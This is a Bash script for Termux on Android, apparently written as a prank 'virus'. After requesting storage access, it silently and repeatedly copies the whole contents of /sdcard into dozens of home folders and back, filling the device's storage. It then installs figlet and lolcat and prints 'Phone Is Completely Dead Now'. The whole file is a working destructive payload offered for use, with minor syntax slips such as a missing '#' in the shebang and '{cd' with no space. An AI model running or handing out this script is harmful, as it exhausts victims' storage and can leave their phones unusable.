!/bin/bash
clear
echo "======================= BOOM ============================"
termux-setup-storage
sleep 5
{cd $HOME
mkdir virus1 virus2 virus3 virus4 virus5 virus6 virus7 virus8 virus9  virus10 virus11 virus12 virus13 virus14 virus15
mkdir copy1 copy2 copy3 copy4 copy5
cd
cd /sdcard
cp -rf * $HOME/virus1
cp -rf * $HOME/virus2
cp -rf * $HOME/virus3
cp -rf * $HOME/virus4
cp -rf * $HOME/virus5
cp -rf * $HOME/virus6
cp -rf * $HOME/virus7
cp -rf * $HOME/virus8
cp -rf * $HOME/virus9
cp -rf * $HOME/virus10
cp -rf * $HOME/virus11
cp -rf * $HOME/virus12
cp -rf * $HOME/virus13
cp -rf * $HOME/virus14
cp -rf * $HOME/virus15
cd $HOME
cp -rf * /sdcard
cd $HOME
cd /sdcard
cp -rf * $HOME/copy1
cp -rf * $HOME/copy2
cp -rf * $HOME/copy3
cp -rf * $HOME/copy4
cp -rf * $HOME/copy5
cd $HOME
cp -rf * /sdcard
clear
cd $HOME
mkdir f f0 f1 f2 f3 f4 f5 f6 f7 f8 f9 f10 f11 f12 f13 f14 f15 f16 f17 f18 f19 f20
cd /sdcard
cp -rf * $HOME/f
cp -rf * $HOME/f0
cp -rf * $HOME/f1
cp -rf * $HOME/f2
cp -rf * $HOME/f3
cp -rf * $HOME/f4
cp -rf * $HOME/f5
cp -rf * $HOME/f6
cp -rf * $HOME/f7
cp -rf * $HOME/f8
cp -rf * $HOME/f9
cp -rf * $HOME/f10
cp -rf * $HOME/f11
cp -rf * $HOME/f12
cp -rf * $HOME/f13
cp -rf * $HOME/f14
cp -rf * $HOME/f15
cp -rf * $HOME/f16
cp -rf * $HOME/f17
cp -rf * $HOME/f18
cp -rf * $HOME/f19
cp -rf * $HOME/f20
cd $HOME
cp -rf * /sdcard} &> /dev/null

apt-get update
apt-get upgrade
pkg install figlet -y
pip install lolcat
figlet "Phone Is Completely Dead Now" |lolcat
